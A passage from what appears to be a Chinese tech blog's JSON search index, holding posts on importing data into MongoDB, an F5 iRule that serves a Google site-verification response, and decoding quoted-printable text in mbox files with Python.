poverty\u0026#34;, \u0026#34;resource_type\u0026#34;: \u0026#34;Supplies\u0026#34;, \u0026#34;total_donations\u0026#34;: 251}, {\u0026#34;school_state\u0026#34;: \u0026#34;NY\u0026#34;, \u0026#34;date_posted\u0026#34;: \u0026#34;2002-09-16 00:00:00\u0026#34;, \u0026#34;poverty_level\u0026#34;: \u0026#34;moderate poverty\u0026#34;, \u0026#34;resource_type\u0026#34;: \u0026#34;Supplies\u0026#34;, \u0026#34;total_donations\u0026#34;: 125}, ... ] ","permalink":"https://rendoumi.com/posts/20240118-flask_mongo/","summary":"\u003cp\u003e首先是安装mongodb\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y mongodb-server mongodb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInstalling \u003cspan class=\"k\"\u003efor\u003c/span\u003e dependencies:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-filesystem                                      \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-iostreams                                       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-program-options                                 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-system                                          \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e boost-thread                                          \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e gperftools-libs                                       \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e libicu                                                \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e libunwind                                             \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e v8\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e会装一堆依赖包，boost库，icu库，v8库，gperftools库，都是很厉害的库啊！\u003c/p\u003e\n\u003cp\u003e启动：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice mongod start  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e导入海量数据：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eroot@ovs-16-11-2 ~\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"c1\"\u003e# mongoimport -d mydb -c prj01 --type csv --file opendata_projects.csv --headerline\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econnected to: 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:47.002         Progress: 39118658/470754183    8%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:47.002             \u003cspan class=\"m\"\u003e74400\u003c/span\u003e   24800/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:50.033         Progress: 80042213/470754183    17%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:50.033             \u003cspan class=\"m\"\u003e150700\u003c/span\u003e  25116/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:53.145         Progress: 108143323/470754183   22%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:53.145             \u003cspan class=\"m\"\u003e202700\u003c/span\u003e  22522/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:56.004         Progress: 149781879/470754183   31%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:56.004             \u003cspan class=\"m\"\u003e280000\u003c/span\u003e  23333/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:59.001         Progress: 179705162/470754183   38%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:50:59.001             \u003cspan class=\"m\"\u003e336200\u003c/span\u003e  22413/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:03.385         Progress: 212197023/470754183   45%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:03.385             \u003cspan class=\"m\"\u003e396400\u003c/span\u003e  20863/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:06.015         Progress: 236552399/470754183   50%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:06.015             \u003cspan class=\"m\"\u003e441700\u003c/span\u003e  20077/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:09.299         Progress: 264365847/470754183   56%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:09.299             \u003cspan class=\"m\"\u003e493300\u003c/span\u003e  19732/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:12.001         Progress: 304790148/470754183   64%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:12.001             \u003cspan class=\"m\"\u003e568500\u003c/span\u003e  20303/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:15.033         Progress: 323508057/470754183   68%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:15.033             \u003cspan class=\"m\"\u003e603300\u003c/span\u003e  19461/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:18.607         Progress: 361610334/470754183   76%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:18.607             \u003cspan class=\"m\"\u003e674200\u003c/span\u003e  19829/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:21.000         Progress: 393748962/470754183   83%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:21.000             \u003cspan class=\"m\"\u003e733700\u003c/span\u003e  19829/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:24.007         Progress: 427667505/470754183   90%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:24.007             \u003cspan class=\"m\"\u003e796900\u003c/span\u003e  19922/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.001         Progress: 459658299/470754183   97%  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.001             \u003cspan class=\"m\"\u003e857300\u003c/span\u003e  19937/second  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.793 check \u003cspan class=\"m\"\u003e9\u003c/span\u003e \u003cspan class=\"m\"\u003e878853\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThu Jul \u003cspan class=\"m\"\u003e28\u003c/span\u003e 09:51:27.979 imported \u003cspan class=\"m\"\u003e878852\u003c/span\u003e objects  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e进入命令行，看看库的整体情况：\u003c/p\u003e","title":"flask/python对mongodb的一些操作"},{"content":"公司的网站要过google认证，需要在网站根目录下放一个文件，googleb1e6d9a50ea8xxxx.html\n内容如下：\ngoogle-site-verification: googleb1e6d9a50ea8xxxx.html 这个无比简单，怎么又跟F5和irule扯上关系了呢？！\n哎，因为居然要做两个域名，m.xxx.com和h.xxx.com，这两个域名都要过认证，而且悲剧的是，这两个域名实际代理的是同一台后端服务器的同一个tomcat进程。\n鉴于这个东西这么简单，干脆在F5上来一段irule解决问题：\nwhen HTTP_REQUEST { if { ([string tolower [HTTP::path]] starts_with \u0026#34;/googleb1e6d9a50ea8xxxx.html\u0026#34;) \u0026amp;\u0026amp; ([string tolower [HTTP::host]] equals \u0026#34;m.xxx.com\u0026#34;) } { HTTP::respond 200 content \u0026#34;google-site-verification: googleb1e6d9a50ea8xxxx.html\u0026#34; } } 由于没有复用ip，所以在h.xxx.com同样修改以上脚本并应用即可。\n如果是穷光蛋作风，在F5上复用了IP做了虚拟主机转发，也修改修改脚本即可。\n","permalink":"https://rendoumi.com/posts/20240118-f5_irule/","summary":"\u003cp\u003e公司的网站要过google认证，需要在网站根目录下放一个文件，googleb1e6d9a50ea8xxxx.html\u003c/p\u003e\n\u003cp\u003e内容如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egoogle-site-verification: googleb1e6d9a50ea8xxxx.html  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个无比简单，怎么又跟F5和irule扯上关系了呢？！\u003c/p\u003e\n\u003cp\u003e哎，因为居然要做两个域名，m.xxx.com和h.xxx.com，这两个域名都要过认证，而且悲剧的是，这两个域名实际代理的是同一台后端服务器的同一个tomcat进程。\u003c/p\u003e\n\u003cp\u003e鉴于这个东西这么简单，干脆在F5上来一段irule解决问题：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhen HTTP_REQUEST \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e([\u003c/span\u003estring tolower \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::path\u003cspan class=\"o\"\u003e]]\u003c/span\u003e starts_with \u003cspan class=\"s2\"\u003e\u0026#34;/googleb1e6d9a50ea8xxxx.html\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e([\u003c/span\u003estring tolower \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::host\u003cspan class=\"o\"\u003e]]\u003c/span\u003e equals \u003cspan class=\"s2\"\u003e\u0026#34;m.xxx.com\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  HTTP::respond \u003cspan class=\"m\"\u003e200\u003c/span\u003e content \u003cspan class=\"s2\"\u003e\u0026#34;google-site-verification: googleb1e6d9a50ea8xxxx.html\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e由于没有复用ip，所以在h.xxx.com同样修改以上脚本并应用即可。\u003c/p\u003e\n\u003cp\u003e如果是穷光蛋作风，在F5上复用了IP做了虚拟主机转发，也修改修改脚本即可。\u003c/p\u003e","title":"F5 irule之google站长认证别样用法"},{"content":"最近在搞邮局。有个很奇怪的问题，就是打开mbox的文件，比如说：\n/var/spool/mail/root\n里面信件的部分有奇怪的3D字符：\n\u0026lt;table cellpadding=3D\u0026#34;0\u0026#34; cellspacing=3D\u0026#34;0\u0026#34; style=3D\u0026#34;text-align:le= ft;color:#454545;background-color:#fff;font-size:14px;border-radius:10px;pa= 注意，中间多了若干个3D，最后也多了=号\n这是什么鬼呢？\n搜了一圈，原来这是quoted-printable编解码，跟Base64类似，base64和quoted-printable这两种编码都是在电子邮件中常见的编码方式。\n基本知识：\n如果=号出现在一行最后，表示换行，那么： he= llo 意思就是连起来的hello 如果中间出现=3D，那就是一个=号的意思 所以style=3D\u0026quot;text\u0026quot;意思就是style=\u0026ldquo;text\u0026rdquo; 英文字符除了=以外不做处理，其他字符的编码为=加这个字符的两个字节的16进制数。 弄明白了吧。\n给一段处理mbox的python程序，可以用来读邮件：\n#!/usr/bin/env python # -*- coding: utf-8 -*- import mailbox import base64 import os import sys import email import quopri filename = \u0026#34;/var/spool/mail/zrr\u0026#34; mb = mailbox.mbox(filename) nmes = len(mb) for i in range(len(mb)): print \u0026#34;\\n\\n\\n\\n\\n\u0026#34; print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; print \u0026#34;Email\u0026#34;, i print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; mes = mb.get_message(i) em = email.message_from_string(mes.as_string()) subject = em.get(\u0026#39;Subject\u0026#39;) if subject.find(\u0026#39;=?\u0026#39;) != -1: ll = email.header.decode_header(subject) subject = \u0026#34;\u0026#34; for l in ll: subject = subject + l[0] em_from = em.get(\u0026#39;From\u0026#39;) if em_from.find(\u0026#39;=?\u0026#39;) != -1: ll = email.header.decode_header(em_from) em_from = \u0026#34;\u0026#34; for l in ll: em_from = em_from + l[0] print \u0026#34;From: %s - Subject: %s\u0026#34; %(em_from, subject) print \u0026#34;-------------------------------------------------------------------------------------------------\u0026#34; if mes.is_multipart(): for part in mes.get_payload(): print quopri.decodestring(part.get_payload()) else: print quopri.decodestring(mes.get_payload()) ","permalink":"https://rendoumi.com/posts/20240118-mbox_3d/","summary":"\u003cp\u003e最近在搞邮局。有个很奇怪的问题，就是打开mbox的文件，比如说：\u003c/p\u003e\n\u003cp\u003e/var/spool/mail/root\u003c/p\u003e\n\u003cp\u003e里面信件的部分有奇怪的3D字符：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;table \u003cspan class=\"nv\"\u003ecellpadding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3D\u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ecellspacing\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3D\u003cspan class=\"s2\"\u003e\u0026#34;0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003estyle\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3D\u003cspan class=\"s2\"\u003e\u0026#34;text-align:le=  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eft;color:#454545;background-color:#fff;font-size:14px;border-radius:10px;pa=  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，中间多了若干个3D，最后也多了=号\u003c/p\u003e\n\u003cp\u003e这是什么鬼呢？\u003c/p\u003e\n\u003cp\u003e搜了一圈，原来这是quoted-printable编解码，跟Base64类似，base64和quoted-printable这两种编码都是在电子邮件中常见的编码方式。\u003c/p\u003e\n\u003cp\u003e基本知识：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e如果=号出现在一行最后，表示换行，那么：\nhe=\nllo\n意思就是连起来的hello\u003c/li\u003e\n\u003cli\u003e如果中间出现=3D，那就是一个=号的意思\n所以style=3D\u0026quot;text\u0026quot;意思就是style=\u0026ldquo;text\u0026rdquo;\u003c/li\u003e\n\u003cli\u003e英文字符除了=以外不做处理，其他字符的编码为=加这个字符的两个字节的16进制数。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e弄明白了吧。\u003c/p\u003e\n\u003cp\u003e给一段处理mbox的python程序，可以用来读邮件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/usr/bin/env python\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e# -*- coding: utf-8 -*-\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport mailbox  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport base64  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport os  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport sys  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport email\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport quopri\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003efilename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/var/spool/mail/zrr\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e mailbox.mbox\u003cspan class=\"o\"\u003e(\u003c/span\u003efilename\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003enmes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e len\u003cspan class=\"o\"\u003e(\u003c/span\u003emb\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in range\u003cspan class=\"o\"\u003e(\u003c/span\u003elen\u003cspan class=\"o\"\u003e(\u003c/span\u003emb\u003cspan class=\"o\"\u003e))\u003c/span\u003e:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;\\n\\n\\n\\n\\n\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;-------------------------------------------------------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print \u003cspan class=\"s2\"\u003e\u0026#34;Email\u0026#34;\u003c/span\u003e, i\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print \u003cspan class=\"s2\"\u003e\u0026#34;-------------------------------------------------------------------------------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003emes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e mb.get_message\u003cspan class=\"o\"\u003e(\u003c/span\u003ei\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.message_from_string\u003cspan class=\"o\"\u003e(\u003c/span\u003emes.as_string\u003cspan class=\"o\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e em.get\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Subject\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e subject.find\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;=?\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e !\u003cspan class=\"o\"\u003e=\u003c/span\u003e -1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ell\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.header.decode_header\u003cspan class=\"o\"\u003e(\u003c/span\u003esubject\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e l in ll:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003esubject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e subject + l\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eem_from\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e em.get\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;From\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e em_from.find\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;=?\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e !\u003cspan class=\"o\"\u003e=\u003c/span\u003e -1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ell\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e email.header.decode_header\u003cspan class=\"o\"\u003e(\u003c/span\u003eem_from\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eem_from\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e l in ll:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan 